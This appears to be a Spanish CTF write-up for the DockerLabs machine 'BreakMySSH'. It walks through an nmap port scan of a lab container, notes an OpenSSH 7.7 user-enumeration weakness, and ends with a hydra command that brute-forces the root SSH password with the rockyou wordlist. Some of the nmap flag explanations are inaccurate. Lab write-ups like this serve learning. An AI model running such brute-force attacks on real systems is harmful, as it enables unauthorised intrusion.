# BreakMySSH
**Herramientas y recursos usados**
- nmap
- searchsploit
- hydra

# Enumeración

Empezamos con un escaneo de los puertos.

`sudo nmap -p- --open -sC -sS -sV --min-rate=5000 -n -Pn -vvv 172.17.0.2 -oN BreakMySSH`

- `-p-` : Todos los puertos
- `--open` : Todos los puertos abiertos
- `-sC` : Escaneo de todos los scripts
- `-sS` : Escaneo de todos los servicios
- `-sV` : Escaneo de todas las versiones de los servicios
- `--min-rate 5000` : Establece mínimo envío de paquetes mínimos 5000/s
- `-n` : No aplica resolución DNS
- `-Pn` : Omisión de detección de hosts
- `-vvv` : Verbose - Muestra toda la información

# Resultado escaneo
![BMS_1](https://github.com/giustiand/DockerLabs-Writeups/blob/main/MuyF%C3%A1cil/.images/BreakMySSH/BMS_1.jpg)  

El único puerto abierto es el 22, que corresponde al servicio SSH.
Si hacemos una rápida busqueda en Google podemos observar que la versión de OpenSSH 7.7 tiene la vulnerabilidad de "user enumeration".
 
![BMS_2](https://github.com/giustiand/DockerLabs-Writeups/blob/main/MuyF%C3%A1cil/.images/BreakMySSH/BMS_2.jpg)  

Lo que podríamos hacer en este caso es lanzar un ataque de fuerza bruta tanto para el usuario como para la contraseña.
Otra cosa que podríamos hacer es hacer un ataque de fuerza bruta contra el usuario `root` que sabemos que está disponible en todos los sistemas Linux.
Para ello utilizaremos la herramienta `hydra`.  

```
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```






